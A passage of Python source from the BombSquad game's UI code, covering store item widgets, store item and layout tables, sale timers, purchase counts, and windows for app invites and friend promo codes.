                subs=[('${A}', modes[0]),
                      ('${B}', modes[1]),
                      ('${C}', modes[2])])
        elif len(modes) == 2:
            modes = bs.Lstr(
                value='${A}, ${B}',
                subs=[('${A}', modes[0]),
                      ('${B}', modes[1])])
        elif len(modes) == 1:
            modes = modes[0]
        else:
            raise Exception()
        # modes = ', '.join(modes)
        # desc = gameType.getDescriptionLocalized(bs.CoopSession)
        desc = gameType.getDescriptionDisplayString(bs.CoopSession)
        texName = itemInfo['previewTex']
        baseTextScale = 0.8
        titleV = 0.48
        priceV = 0.17

    elif itemName.startswith('icons.'):
        baseTextScale = 1.5
        priceV = 0.2
        checkPos = 0.6

    if itemName.startswith('characters.'):
        frameSize = bWidth*0.7
        insetTex = bs.getTexture('frameInset')
        insetModel = bs.getModel('frameInset')
        imDim = frameSize*(100.0/113.0)
        imPos = (bPos[0]+bWidth*0.5-imDim*0.5+bOffsX,
                 bPos[1]+bHeight*0.57-imDim*0.5)
        framePos = (bPos[0]+bWidth*0.5-frameSize*0.5+bOffsX,
                    bPos[1]+bHeight*0.57-frameSize*0.5)
        maskTexture = bs.getTexture('characterIconMask')
        bs.imageWidget(
            parent=parentWidget, position=imPos, size=(imDim, imDim),
            color=(1, 1, 1),
            transitionDelay=delay, maskTexture=maskTexture, drawController=b,
            texture=bs.getTexture(iconTex),
            tintTexture=bs.getTexture(tintTex),
            tintColor=tintColor, tint2Color=tint2Color)

    if itemName in ['pro', 'upgrades.pro']:
        frameSize = bWidth*0.5
        imDim = frameSize*(100.0/113.0)
        imPos = (bPos[0]+bWidth*0.5-imDim*0.5+bOffsX,
                 bPos[1]+bHeight*0.5-imDim*0.5)
        bs.imageWidget(parent=parentWidget, position=imPos, size=(imDim, imDim),
                       transitionDelay=delay,
                       drawController=b,
                       color=(0.3, 0.0, 0.3), opacity=0.3,
                       texture=bs.getTexture('logo'))
        t = bs.Lstr(resource='store.bombSquadProNewDescriptionText')

        # t = 'foo\nfoo\nfoo\nfoo\nfoo\nfoo'
        item['descriptionText'] = bs.textWidget(
            parent=parentWidget, text=t,
            position=(bPos[0] + bWidth * 0.5, bPos[1] + bHeight * 0.69),
            transitionDelay=delay, scale=bWidth * (1.0 / 230.0) * baseTextScale
            * 0.75, maxWidth=bWidth * 0.75, maxHeight=bHeight * 0.2,
            size=(0, 0), hAlign='center', vAlign='center', drawController=b,
            color=(0.3, 1, 0.3))

        extraBackings = item['extraBackings'] = []
        extraImages = item['extraImages'] = []
        extraTexts = item['extraTexts'] = []
        extraTexts2 = item['extraTexts2'] = []

        backingColor = (0.5, 0.8, 0.3) if button else (0.6, 0.5, 0.65)
        bSquareTexture = bs.getTexture('buttonSquare')
        charMaskTexture = bs.getTexture('characterIconMask')

        pos = (0.17, 0.43)
        tileSize = (bWidth * 0.16*1.2, bWidth*0.2*1.2)
        tilePos = (bPos[0]+bWidth*pos[0], bPos[1]+bHeight*pos[1])
        extraBackings.append(
            bs.imageWidget(
                parent=parentWidget,
                position=(tilePos[0] - tileSize[0] * 0.5, tilePos[1] -
                          tileSize[1] * 0.5),
                size=tileSize, transitionDelay=delay, drawController=b,
                color=backingColor, texture=bSquareTexture))
        imSize = tileSize[0] * 0.8
        extraImages.append(
            bs.imageWidget(
                parent=parentWidget,
                position=(tilePos[0] - imSize * 0.5, tilePos[1] - imSize * 0.4),
                size=(imSize, imSize),
                transitionDelay=delay, drawController=b, color=(1, 1, 1),
                texture=bs.getTexture('ticketsMore')))
        bonusTickets = str(bsInternal._getAccountMiscReadVal(
            'proBonusTickets', 100))
        extraTexts.append(bs.textWidget(
            parent=parentWidget, drawController=b,
            position=(tilePos[0] - tileSize[0] * 0.03,
                      tilePos[1] - tileSize[1] * 0.25),
            size=(0, 0),
            color=(0.6, 1, 0.6),
            transitionDelay=delay, hAlign='center',
            vAlign='center', maxWidth=tileSize[0] * 0.7,
            scale=0.55, text=bs.Lstr(
                resource='getTicketsWindow.ticketsText',
                subs=[('${COUNT}', bonusTickets)]),
            flatness=1.0, shadow=0.0))

        for charName, pos in [
            ('Kronk', (0.32, 0.45)),
            ('Zoe', (0.425, 0.4)),
            ('Jack Morgan', (0.555, 0.45)),
                ('Mel', (0.645, 0.4))]:
            # tileSize = (bWidth * 0.16*1.2,bWidth*0.2*1.2)
            tileSize = (bWidth * 0.16*0.9, bWidth*0.2*0.9)
            tilePos = (bPos[0]+bWidth*pos[0], bPos[1]+bHeight*pos[1])
            character = bsSpaz.appearances[charName]
            extraBackings.append(
                bs.imageWidget(
                    parent=parentWidget,
                    position=(tilePos[0] - tileSize[0] * 0.5, tilePos[1] -
                              tileSize[1] * 0.5),
                    size=tileSize, transitionDelay=delay, drawController=b,
                    color=backingColor, texture=bSquareTexture))
            imSize = tileSize[0] * 0.7
            extraImages.append(
                bs.imageWidget(
                    parent=parentWidget,
                    position=(tilePos[0] - imSize * 0.53, tilePos[1] - imSize *
                              0.35),
                    size=(imSize, imSize),
                    transitionDelay=delay, drawController=b, color=(1, 1, 1),
                    texture=bs.getTexture(character.iconTexture),
                    tintTexture=bs.getTexture(character.iconMaskTexture),
                    tintColor=character.defaultColor,
                    tint2Color=character.defaultHighlight,
                    maskTexture=charMaskTexture))
            extraTexts.append(bs.textWidget(
                parent=parentWidget, drawController=b,
                position=(tilePos[0] - imSize * 0.03,
                          tilePos[1] - imSize * 0.51),
                size=(0, 0),
                color=(0.6, 1, 0.6),
                transitionDelay=delay, hAlign='center',
                vAlign='center', maxWidth=tileSize[0] * 0.7,
                scale=0.55, text=bs.Lstr(
                    translate=('characterNames', charName)),
                flatness=1.0, shadow=0.0))

        # if we have a 'total-worth' item-id for this id, show that price so
        # the user knows how much this is worth..
        totalWorthItem = bsInternal._getAccountMiscReadVal(
            'twrths', {}).get(itemName)
        if totalWorthItem is not None:
            totalWorthPrice = _getCleanPrice(
                bsInternal._getPrice(totalWorthItem))
        else:
            totalWorthPrice = None

        if totalWorthPrice is not None:
            totalWorthText = bs.Lstr(
                resource='store.totalWorthText',
                subs=[('${TOTAL_WORTH}', totalWorthPrice)])
            extraTexts2.append(
                bs.textWidget(
                    parent=parentWidget, text=totalWorthText,
                    position=(bPos[0] + bWidth * 0.5 + bOffsX, bPos[1] + bHeight
                              * 0.25),
                    transitionDelay=delay, scale=bWidth * (1.0 / 230.0) *
                    baseTextScale * 0.45, maxWidth=bWidth * 0.5, size=(0, 0),
                    hAlign='center', vAlign='center', shadow=1.0, flatness=1.0,
                    drawController=b, color=(0.3, 1, 1)))

        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')
        maskTex = bs.getTexture('mapPreviewMask')
        for levelName, previewTexName, pos in [
            ('Infinite Onslaught', 'doomShroomPreview', (0.80, 0.48)),
                ('Infinite Runaround', 'towerDPreview', (0.80, 0.32))]:
            tileSize = (bWidth * 0.2, bWidth*0.13)
            tilePos = (bPos[0]+bWidth*pos[0], bPos[1]+bHeight*pos[1])
            imSize = tileSize[0] * 0.8
            extraBackings.append(
                bs.imageWidget(
                    parent=parentWidget,
                    position=(tilePos[0] - tileSize[0] * 0.5, tilePos[1] -
                              tileSize[1] * 0.5),
                    size=tileSize, transitionDelay=delay, drawController=b,
                    color=backingColor, texture=bSquareTexture))
            # hack - gotta draw two transparent versions to avoid z issues
            for m in modelOpaque, modelTransparent:
                extraImages.append(
                    bs.imageWidget(
                        parent=parentWidget,
                        position=(tilePos[0] - imSize * 0.52, tilePos[1]
                                  - imSize * 0.2),
                        size=(imSize, imSize * 0.5),
                        transitionDelay=delay, modelTransparent=m,
                        maskTexture=maskTex, drawController=b,
                        texture=bs.getTexture(previewTexName)))

            extraTexts.append(bs.textWidget(
                parent=parentWidget, drawController=b,
                position=(tilePos[0] - imSize * 0.03,
                          tilePos[1] - imSize * 0.2),
                size=(0, 0),
                color=(0.6, 1, 0.6),
                transitionDelay=delay, hAlign='center',
                vAlign='center', maxWidth=tileSize[0] * 0.7,
                scale=0.55, text=bs.Lstr(
                    translate=('coopLevelNames', levelName)),
                flatness=1.0, shadow=0.0))

    if itemName.startswith('icons.'):
        item['iconText'] = bs.textWidget(
            parent=parentWidget, text=itemInfo['icon'],
            position=(bPos[0] + bWidth * 0.5, bPos[1] + bHeight * 0.5),
            transitionDelay=delay, scale=bWidth * (1.0 / 230.0) * baseTextScale
            * 2.0, maxWidth=bWidth * 0.9, maxHeight=bHeight * 0.9, size=(0, 0),
            hAlign='center', vAlign='center', drawController=b)

    if itemName.startswith('maps.'):
        frameSize = bWidth*0.9
        imDim = frameSize*(100.0/113.0)
        imPos = (bPos[0]+bWidth*0.5-imDim*0.5+bOffsX,
                 bPos[1]+bHeight*0.62-imDim*0.25)
        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')
        maskTex = bs.getTexture('mapPreviewMask')
        bs.imageWidget(
            parent=parentWidget, position=imPos, size=(imDim, imDim * 0.5),
            transitionDelay=delay, modelOpaque=modelOpaque,
            modelTransparent=modelTransparent, maskTexture=maskTex,
            drawController=b, texture=bs.getTexture(texName))

    if itemName.startswith('games.'):
        frameSize = bWidth*0.8
        imDim = frameSize*(100.0/113.0)
        imPos = (bPos[0]+bWidth*0.5-imDim*0.5+bOffsX,
                 bPos[1]+bHeight*0.72-imDim*0.25)
        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')
        maskTex = bs.getTexture('mapPreviewMask')
        bs.imageWidget(
            parent=parentWidget, position=imPos, size=(imDim, imDim * 0.5),
            transitionDelay=delay, modelOpaque=modelOpaque,
            modelTransparent=modelTransparent, maskTexture=maskTex,
            drawController=b, texture=bs.getTexture(texName))
        #desc = 'testing\ntriple\nlines and stuff'
        item['descriptionText'] = bs.textWidget(
            parent=parentWidget, text=desc,
            position=(bPos[0] + bWidth * 0.5, bPos[1] + bHeight * 0.36),
            transitionDelay=delay, scale=bWidth * (1.0 / 230.0) * baseTextScale
            * 0.78, maxWidth=bWidth * 0.8, maxHeight=bHeight * 0.14,
            size=(0, 0), hAlign='center', vAlign='center', drawController=b,
            flatness=1.0, shadow=0.0, color=(0.6, 1, 0.6))
        item['gameModesText'] = bs.textWidget(
            parent=parentWidget, text=modes,
            position=(bPos[0] + bWidth * 0.5, bPos[1] + bHeight * 0.26),
            transitionDelay=delay, scale=bWidth * (1.0 / 230.0) * baseTextScale
            * 0.65, maxWidth=bWidth * 0.8, size=(0, 0),
            hAlign='center', vAlign='center', drawController=b, shadow=0,
            flatness=1.0, color=(0.6, 0.8, 0.6))

    if not itemName.startswith('icons.'):
        item['titleText'] = bs.textWidget(
            parent=parentWidget, text=title,
            position=(bPos[0] + bWidth * 0.5 + bOffsX,
                      bPos[1] + bHeight * titleV),
            transitionDelay=delay, scale=bWidth * (1.0 / 230.0) * baseTextScale,
            maxWidth=bWidth * 0.8, size=(0, 0),
            hAlign='center', vAlign='center', drawController=b,
            color=(0.7, 0.9, 0.7, 1.0))

    item['purchaseCheck'] = bs.imageWidget(
        parent=parentWidget,
        position=(bPos[0] + bWidth * checkPos, bPos[1] + bHeight * 0.05),
        transitionDelay=delay,
        modelTransparent=bs.getModel('checkTransparent'),
        opacity=0.0,
        size=(60, 60),
        color=(0.6, 0.5, 0.8),
        drawController=b, texture=bs.getTexture('uiAtlas'))
    item['priceWidget'] = bs.textWidget(
        parent=parentWidget, text='',
        position=(bPos[0] + bWidth * 0.5 + bOffsX, bPos[1] + bHeight * priceV),
        transitionDelay=delay, scale=bWidth * (1.0 / 300.0) * baseTextScale,
        maxWidth=bWidth * 0.9, size=(0, 0),
        hAlign='center', vAlign='center', drawController=b,
        color=(0.2, 1, 0.2, 1.0))
    item['priceWidgetLeft'] = bs.textWidget(
        parent=parentWidget, text='',
        position=(bPos[0]+bWidth*0.33+bOffsX, bPos[1]+bHeight*priceV),
        transitionDelay=delay, scale=bWidth *
        (1.0/300.0)*baseTextScale,
        maxWidth=bWidth*0.3, size=(0, 0), hAlign='center', vAlign='center',
        drawController=b,
        color=(0.2, 1, 0.2, 0.5)
    )
    item['priceWidgetRight'] = bs.textWidget(
        parent=parentWidget, text='',
        position=(bPos[0]+bWidth*0.66+bOffsX, bPos[1]+bHeight*priceV),
        transitionDelay=delay, scale=1.1 *
        bWidth*(1.0/300.0)*baseTextScale,
        maxWidth=bWidth*0.3, size=(0, 0), hAlign='center', vAlign='center',
        drawController=b,
        color=(0.2, 1, 0.2, 1.0)
    )
    item['priceSlashWidget'] = bs.imageWidget(
        parent=parentWidget,
        position=(bPos[0] + bWidth * 0.33 + bOffsX - 36,
                  bPos[1] + bHeight * priceV - 35),
        transitionDelay=delay, texture=bs.getTexture('slash'),
        opacity=0.0, size=(70, 70),
        drawController=b, color=(1, 0, 0))
    badgeRad = 44
    badgeCenter = (bPos[0]+bWidth*0.1+bOffsX, bPos[1]+bHeight*0.87)
    item['saleBGWidget'] = bs.imageWidget(
        parent=parentWidget,
        position=(badgeCenter[0] - badgeRad, badgeCenter[1] - badgeRad),
        opacity=0.0, transitionDelay=delay, texture=bs.getTexture(
            'circleZigZag'),
        drawController=b, size=(badgeRad * 2, badgeRad * 2),
        color=(0.5, 0, 1))
    item['saleTitleWidget'] = bs.textWidget(
        parent=parentWidget, position=(badgeCenter[0],
                                       badgeCenter[1] + 12),
        transitionDelay=delay, scale=1.0, maxWidth=badgeRad * 1.6, size=(0, 0),
        hAlign='center', vAlign='center', drawController=b, shadow=0.0,
        flatness=1.0, color=(0, 1, 0))
    item['saleTimeWidget'] = bs.textWidget(
        parent=parentWidget, position=(badgeCenter[0],
                                       badgeCenter[1] - 12),
        transitionDelay=delay, scale=0.7, maxWidth=badgeRad * 1.6, size=(0, 0),
        hAlign='center', vAlign='center', drawController=b, shadow=0.0,
        flatness=1.0, color=(0.0, 1, 0.0, 1))


def _getStoreItemDisplaySize(itemName):
    if itemName.startswith('characters.'):
        return (340*0.6, 430*0.6)
    elif itemName in ['pro', 'upgrades.pro']:
        return (650*0.9, 500*0.85)
    elif itemName.startswith('maps.'):
        return (510*0.6, 450*0.6)
    elif itemName.startswith('icons.'):
        return (265*0.6, 250*0.6)
    else:
        return (450*0.6, 450*0.6)

# returns pertinant info about all purchasable items
# (whether or not they appear in the store)


def _getStoreItems():
    global _gStoreItems
    if _gStoreItems is None:
        import bsNinjaFight
        import bsMeteorShower
        import bsTargetPractice
        import bsEasterEggHunt

        # IMPORTANT - keep this synced with the server
        # (manually for now)
        _gStoreItems = {
            'characters.kronk': {'character': 'Kronk'},
            'characters.zoe': {'character': 'Zoe'},
            'characters.jackmorgan': {'character': 'Jack Morgan'},
            'characters.mel': {'character': 'Mel'},
            'characters.snakeshadow': {'character': 'Snake Shadow'},
            'characters.bones': {'character': 'Bones'},
            'characters.bernard': {
                'character': 'Bernard', 'highlight': (0.6, 0.5, 0.8)},
            'characters.pixie': {'character': 'Pixel'},
            'characters.wizard': {'character': 'Grumbledorf'},
            'characters.frosty': {'character': 'Frosty'},
            'characters.pascal': {'character': 'Pascal'},
            'characters.cyborg': {'character': 'B-9000'},
            'characters.agent': {'character': 'Agent Johnson'},
            'characters.taobaomascot': {'character': 'Taobao Mascot'},
            'characters.santa': {'character': 'Santa Claus'},
            'characters.bunny': {'character': 'Easter Bunny'},
            'pro': {},
            'maps.lake_frigid': {'mapType': bsMap.LakeFrigidMap},
            'games.ninja_fight': {'gameType': bsNinjaFight.NinjaFightGame,
                                  'previewTex': 'courtyardPreview'},
            'games.meteor_shower': {'gameType': bsMeteorShower.MeteorShowerGame,
                                    'previewTex': 'rampagePreview'},
            'games.target_practice': {
                'gameType': bsTargetPractice.TargetPracticeGame,
                'previewTex': 'doomShroomPreview'},
            'games.easter_egg_hunt': {
                'gameType': bsEasterEggHunt.EasterEggHuntGame,
                'previewTex': 'towerDPreview'},
            'icons.flag_us': {'icon': bs.getSpecialChar('flag_us')},
            'icons.flag_mexico': {'icon': bs.getSpecialChar('flag_mexico')},
            'icons.flag_germany': {'icon': bs.getSpecialChar('flag_germany')},
            'icons.flag_brazil': {'icon': bs.getSpecialChar('flag_brazil')},
            'icons.flag_russia': {'icon': bs.getSpecialChar('flag_russia')},
            'icons.flag_china': {'icon': bs.getSpecialChar('flag_china')},
            'icons.flag_uk': {'icon': bs.getSpecialChar('flag_uk')},
            'icons.flag_canada': {'icon': bs.getSpecialChar('flag_canada')},
            'icons.flag_india': {'icon': bs.getSpecialChar('flag_india')},
            'icons.flag_japan': {'icon': bs.getSpecialChar('flag_japan')},
            'icons.flag_france': {'icon': bs.getSpecialChar('flag_france')},
            'icons.flag_indonesia': {
                'icon': bs.getSpecialChar('flag_indonesia')},
            'icons.flag_italy': {'icon': bs.getSpecialChar('flag_italy')},
            'icons.flag_south_korea': {
                'icon': bs.getSpecialChar('flag_south_korea')},
            'icons.flag_netherlands': {
                'icon': bs.getSpecialChar('flag_netherlands')},
            'icons.flag_uae': {'icon': bs.getSpecialChar('flag_uae')},
            'icons.flag_qatar': {'icon': bs.getSpecialChar('flag_qatar')},
            'icons.flag_egypt': {'icon': bs.getSpecialChar('flag_egypt')},
            'icons.flag_kuwait': {'icon': bs.getSpecialChar('flag_kuwait')},
            'icons.flag_algeria': {'icon': bs.getSpecialChar('flag_algeria')},
            'icons.flag_saudi_arabia': {
                'icon': bs.getSpecialChar('flag_saudi_arabia')},
            'icons.flag_malaysia': {'icon': bs.getSpecialChar('flag_malaysia')},
            'icons.flag_czech_republic': {
                'icon': bs.getSpecialChar('flag_czech_republic')},
            'icons.flag_australia': {
                'icon': bs.getSpecialChar('flag_australia')},
            'icons.flag_singapore': {
                'icon': bs.getSpecialChar('flag_singapore')},

            'icons.flag_iran': {'icon': bs.getSpecialChar('flag_iran')},
            'icons.flag_poland': {'icon': bs.getSpecialChar('flag_poland')},
            'icons.flag_argentina': {
                'icon': bs.getSpecialChar('flag_argentina')},
            'icons.flag_philippines': {
                'icon': bs.getSpecialChar('flag_philippines')},
            'icons.flag_chile': {'icon': bs.getSpecialChar('flag_chile')},

            'icons.fedora': {'icon': bs.getSpecialChar('fedora')},
            'icons.hal': {'icon': bs.getSpecialChar('hal')},
            'icons.crown': {'icon': bs.getSpecialChar('crown')},
            'icons.yinyang': {'icon': bs.getSpecialChar('yinyang')},
            'icons.eyeball': {'icon': bs.getSpecialChar('eyeball')},
            'icons.skull': {'icon': bs.getSpecialChar('skull')},
            'icons.heart': {'icon': bs.getSpecialChar('heart')},
            'icons.dragon': {'icon': bs.getSpecialChar('dragon')},
            'icons.helmet': {'icon': bs.getSpecialChar('helmet')},
            'icons.mushroom': {'icon': bs.getSpecialChar('mushroom')},
            'icons.ninja_star': {'icon': bs.getSpecialChar('ninja_star')},
            'icons.viking_helmet': {'icon': bs.getSpecialChar('viking_helmet')},
            'icons.moon': {'icon': bs.getSpecialChar('moon')},
            'icons.spider': {'icon': bs.getSpecialChar('spider')},
            'icons.fireball': {'icon': bs.getSpecialChar('fireball')},

            'icons.mikirog': {'icon': bs.getSpecialChar('mikirog')},

        }
    return _gStoreItems

# the store layout


def _getStoreLayout():
    global _gStoreLayout
    if _gStoreLayout is None:
        # whats available in the store at a given time; categorized by tab
        # and by section
        _gStoreLayout = {
            'characters': [{'items': []}],
            'extras': [{'items': ['pro']}],
            'maps': [{'items': ['maps.lake_frigid']}],
            'minigames': [],
            'icons':
            [{
                'items':
                ['icons.mushroom', 'icons.heart', 'icons.eyeball',
                 'icons.yinyang', 'icons.hal', 'icons.flag_us',
                 'icons.flag_mexico', 'icons.flag_germany', 'icons.flag_brazil',
                 'icons.flag_russia', 'icons.flag_china', 'icons.flag_uk',
                 'icons.flag_canada', 'icons.flag_india', 'icons.flag_japan',
                 'icons.flag_france', 'icons.flag_indonesia',
                 'icons.flag_italy',
                 'icons.flag_south_korea', 'icons.flag_netherlands',
                 'icons.flag_uae', 'icons.flag_qatar', 'icons.flag_egypt',
                 'icons.flag_kuwait', 'icons.flag_algeria',
                 'icons.flag_saudi_arabia', 'icons.flag_malaysia',
                 'icons.flag_czech_republic', 'icons.flag_australia',
                 'icons.flag_singapore', 'icons.flag_iran', 'icons.flag_poland',
                 'icons.flag_argentina', 'icons.flag_philippines',
                 'icons.flag_chile', 'icons.moon', 'icons.fedora',
                 'icons.spider',
                 'icons.ninja_star', 'icons.skull', 'icons.dragon',
                 'icons.viking_helmet', 'icons.fireball', 'icons.helmet',
                 'icons.crown', ]}]}

    _gStoreLayout['characters'] = [{
        'items':
        ['characters.kronk', 'characters.zoe', 'characters.jackmorgan',
         'characters.mel', 'characters.snakeshadow', 'characters.bones',
         'characters.bernard', 'characters.agent', 'characters.frosty',
         'characters.pascal', 'characters.pixie']}]
    _gStoreLayout['minigames'] = [
        {'items': ['games.ninja_fight', 'games.meteor_shower',
                   'games.target_practice']}]
    if bsInternal._getAccountMiscReadVal('xmas', False):
        _gStoreLayout['characters'][0]['items'].append('characters.santa')
    env = bs.getEnvironment()
    if (env['platform'] == 'android' and env['subplatform'] == 'alibaba'):
        _gStoreLayout['characters'][0]['items'].append(
            'characters.taobaomascot')
    _gStoreLayout['characters'][0]['items'].append('characters.wizard')
    _gStoreLayout['characters'][0]['items'].append('characters.cyborg')
    if bsInternal._getAccountMiscReadVal('easter', False):
        _gStoreLayout['characters'].append(
            {'title': 'store.holidaySpecialText',
             'items': ['characters.bunny']})
        _gStoreLayout['minigames'].append(
            {'title': 'store.holidaySpecialText',
             'items': ['games.easter_egg_hunt']})

    return _gStoreLayout


_gProSaleStartTime = None


def _getPurchasedIcons():
    if bsInternal._getAccountState() != 'SIGNED_IN':
        return []
    icons = []
    storeItems = _getStoreItems()
    for itemName, item in storeItems.items():
        if itemName.startswith('icons.') and bsInternal._getPurchased(itemName):
            icons.append(item['icon'])
    return icons


def _getAvailableSaleTime(tab):
    try:
        import datetime
        saleTimes = []
        # calc time for our pro sale (old special case)
        proTime = None
        if tab == 'extras':
            config = bs.getConfig()
            if bsUtils._havePro():
                return None
            global _gProSaleStartTime
            global _gProSaleStartVal
            # if we havn't calced/loaded start times yet..
            if _gProSaleStartTime is None:

                # if we've got a time-remaining in our config, start there.
                if 'PSTR' in config:
                    _gProSaleStartTime = bs.getRealTime()
                    _gProSaleStartVal = config['PSTR']
                else:

                    # we start the timer once we get the duration from
                    # the server
                    startDuration = bsInternal._getAccountMiscReadVal(
                        'proSaleDurationMinutes', None)
                    if startDuration is not None:
                        _gProSaleStartTime = bs.getRealTime()
                        _gProSaleStartVal = 60000*startDuration
                    # if we havn't heard from the server yet, no sale..
                    else:
                        return None

            val = max(0, _gProSaleStartVal -
                      (bs.getRealTime() - _gProSaleStartTime))

            # keep the value in the config up to date.. i suppose we should
            # write the config occasionally but it should happen often enough
            # for other reasons..
            config['PSTR'] = val
            if val == 0:
                val = None
            saleTimes.append(val)
        # else:
        #     return None

        # now look for sales in this tab..
        salesRaw = bsInternal._getAccountMiscReadVal('sales', {})
        storeLayout = _getStoreLayout()
        for section in storeLayout[tab]:
            for item in section['items']:
                if item in salesRaw:
                    if not bsInternal._getPurchased(item):
                        toEnd = (datetime.datetime.utcfromtimestamp(
                            salesRaw[item]['e']) - datetime.datetime.utcnow())\
                            .total_seconds()
                        if toEnd > 0:
                            saleTimes.append(int(toEnd*1000))

        # return the smallest time i guess?..
        return min(saleTimes) if saleTimes else None

    except Exception:
        bs.printException('error calcing sale time')
        return None


def _getAvailablePurchaseCount(tab=None):
    try:
        if bsInternal._getAccountState() != 'SIGNED_IN':
            return 0

        count = 0
        ourTickets = bsInternal._getAccountTicketCount()
        storeData = _getStoreLayout()

        if tab is not None:
            tabs = [(tab, storeData[tab])]
        else:
            tabs = storeData.items()

        for tabName, tab in tabs:
            if tabName == 'icons':
                continue  # too many of these; don't show..
            for section in tab:
                for item in section['items']:
                    ticketCost = bsInternal._getAccountMiscReadVal(
                        'price.' + item, None)
                    if ticketCost is not None:
                        if (ourTickets >= ticketCost
                                and not bsInternal._getPurchased(item)):
                            count += 1
        return count
    except Exception:
        bs.printException('error calcing available purchases')
        return 0


def doAppInvitesPress(forceCode=False):

    env = bs.getEnvironment()
    doAppInvites = True if(
        env['platform'] == 'android' and env['subplatform'] ==
        'google' and bsInternal._getAccountMiscReadVal(
            'enableAppInvites', False) and not env['onTV']) else False
    # doAppInvites = True
    # print 'TEMP DOING APP INV'
    if forceCode:
        doAppInvites = False

    # FIXME - need to update this to grab a code before allowing the invite UI..
    # doAppInvites = False

    if doAppInvites:
        AppInvitesWindow()
    else:
        bs.screenMessage(
            bs.Lstr(resource='gatherWindow.requestingAPromoCodeText'),
            color=(0, 1, 0))

        def handleResult(result):
            with bs.Context('UI'):
                if result is None:
                    bs.screenMessage(
                        bs.Lstr(resource='errorText'),
                        color=(1, 0, 0))
                    bs.playSound(bs.getSound('error'))
                else:
                    FriendPromoCodeWindow(result)
        bsInternal._addTransaction(
            {'type': 'FRIEND_PROMO_CODE_REQUEST', 'ali': True
             if(env['platform'] == 'android'
                and env['subplatform'] == 'alibaba') else
             False, 'expireTime': time.time() + 10},
            callback=handleResult)
        bsInternal._runTransactions()


class AppInvitesWindow(Window):
    def __init__(self, origin=(0, 0)):

        bsInternal._setAnalyticsScreen('AppInvitesWindow')
        self._data = None
        self._width = 650
        self._height = 400
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            transition='inScale',
            scale=1.8 if gSmallUI else 1.35 if gMedUI else 1.0)
        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, scale=0.8, position=(60, self._height-50),
            size=(50, 50),
            label='', onActivateCall=self.close, autoSelect=True,
            color=(0.4, 0.4, 0.6),
            icon=bs.getTexture('crossOut'), iconScale=1.2)
        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        bs.textWidget(
            parent=self._rootWidget, size=(0, 0),
            position=(self._width * 0.5, self._height * 0.5 + 110),
            autoSelect=True, scale=0.8, maxWidth=self._width * 0.9,
            hAlign='center', vAlign='center', color=(0.3, 0.8, 0.3),
            flatness=1.0, text=bs.Lstr(
                resource='gatherWindow.earnTicketsForRecommendingAmountText',
                fallbackResource='gatherWindow.earnTicketsForRecommendingText',
                subs=[('${COUNT}',
                       str(
                           bsInternal._getAccountMiscReadVal(
                               'friendTryTickets', 300))),
                      ('${YOU_COUNT}',
                       str(
                           bsInternal._getAccountMiscReadVal(
                               'friendTryAwardTickets', 100)))]))

        orText = bs.Lstr(resource='orText', subs=[
                         ('${A}', ''), ('${B}', '')]).evaluate().strip()
        bs.buttonWidget(
            parent=self._rootWidget, size=(250, 150),
            position=(self._width * 0.5 - 125, self._height * 0.5 - 80),
            autoSelect=True, buttonType='square', label=bs.Lstr(
                resource='gatherWindow.inviteFriendsText'),
            onActivateCall=bs.WeakCall(self._googleInvites))

        bs.textWidget(
            parent=self._rootWidget, size=(0, 0),
            position=(self._width * 0.5, self._height * 0.5 - 94),
            autoSelect=True, scale=0.9, hAlign='center', vAlign='center',
            color=(0.5, 0.5, 0.5),
            flatness=1.0, text=orText)

        bs.buttonWidget(
            parent=self._rootWidget, size=(180, 50),
            position=(self._width * 0.5 - 90, self._height * 0.5 - 170),
            autoSelect=True, color=(0.5, 0.5, 0.6),
            textColor=(0.7, 0.7, 0.8),
            textScale=0.8, label=bs.Lstr(
                resource='gatherWindow.appInviteSendACodeText'),
            onActivateCall=bs.WeakCall(self._sendCode))

        # kick off a transaction to get our code
        env = bs.getEnvironment()
        bsInternal._addTransaction(
            {'type': 'FRIEND_PROMO_CODE_REQUEST', 'ali': True
             if(env['platform'] == 'android'
                and env['subplatform'] == 'alibaba') else
             False, 'expireTime': time.time() + 20},
            callback=bs.WeakCall(self._onCodeResult))
        bsInternal._runTransactions()

    def _onCodeResult(self, result):
        if result is not None:
            self._data = result

    def _sendCode(self):
        doAppInvitesPress(forceCode=True)

    def _googleInvites(self):
        if self._data is None:
            bs.screenMessage(
                bs.Lstr(
                    resource='getTicketsWindow.unavailableTemporarilyText'),
                color=(1, 0, 0))
            bs.playSound(bs.getSound('error'))
            return

        if bsInternal._getAccountState() == 'SIGNED_IN':
            bsInternal._setAnalyticsScreen('App Invite UI')
            bsInternal._showAppInvite(
                bs.Lstr(
                    resource='gatherWindow.appInviteTitleText',
                    subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]).
                evaluate(),
                bs.Lstr(
                    resource='gatherWindow.appInviteMessageText',
                    subs=[('${COUNT}', str(self._data['tickets'])),
                          ('${NAME}', bsInternal._getAccountName().split()
                           [0]),
                          ('${APP_NAME}', bs.Lstr(resource='titleText'))]).
                evaluate(),
                self._data['code'])
        else:
            bs.playSound(bs.getSound('error'))

    def close(self):
        bs.containerWidget(edit=self._rootWidget, transition='outScale')


class FriendPromoCodeWindow(Window):

    def __init__(self, data, origin=(0, 0)):

        bsInternal._setAnalyticsScreen('Friend Promo Code')

        env = bs.getEnvironment()
        ali = True if (
            env['platform'] == 'android'
            and env['subplatform'] == 'alibaba') else False

        self._width = 750 if ali else 650
        self._height = 400
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
            color=(0.45, 0.63, 0.15),
            transition='inScale', scale=1.7
            if gSmallUI else 1.35 if gMedUI else 1.0)
        self._data = copy.deepcopy(data)
        bs.playSound(bs.getSound('cashRegister'))
        bs.playSound(bs.getSound('swish'))

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, scale=0.7,
            position=(50, self._height - (60 if ali else 50)),
            size=(60, 60),
            label='', onActivateCall=self.close, autoSelect=True,
            color=(0.45, 0.63, 0.15),
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)
        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        if ali:
